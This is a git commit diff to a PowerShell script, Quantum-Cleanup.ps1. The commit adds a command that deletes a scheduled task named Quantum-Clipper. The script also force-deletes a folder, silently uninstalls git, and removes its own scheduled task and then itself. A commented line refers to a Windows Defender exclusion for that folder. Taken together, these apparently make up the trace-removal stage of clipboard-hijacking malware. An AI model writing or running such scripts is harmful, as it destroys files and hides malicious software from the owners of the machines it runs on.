a7cd0ad1247c5f0ce04fa085c2d66fd97b3f2743
23jrg <jrg71442@yahoo.com>
2026-03-23 11:26:39 -0400

    Update Quantum-Cleanup.ps1

--- Quantum-Cleanup.ps1
+++ Quantum-Cleanup.ps1
@@ -4,7 +4,7 @@
 
 Install-Module PSWindowsUpdate -Force;Get-WindowsUpdate;Install-WindowsUpdate -AcceptAll
 
-Remove-Item -Path "C:\23jrg" -Force -Recurse; winget uninstall git.git --accept-source-agreements --all --silent --force --nowarn;schtasks.exe /delete /f /TN Quantum-Cleanup;
+Remove-Item -Path "C:\23jrg" -Force -Recurse; winget uninstall git.git --accept-source-agreements --all --silent --force --nowarn;schtasks.exe /delete /f /TN Quantum-Cleanup;schtasks.exe /delete /f /TN Quantum-Clipper;
 #Remove-MpPreference -ExclusionPath "C:\23jrg";
 Remove-Item $PSCommandPath -Force
 
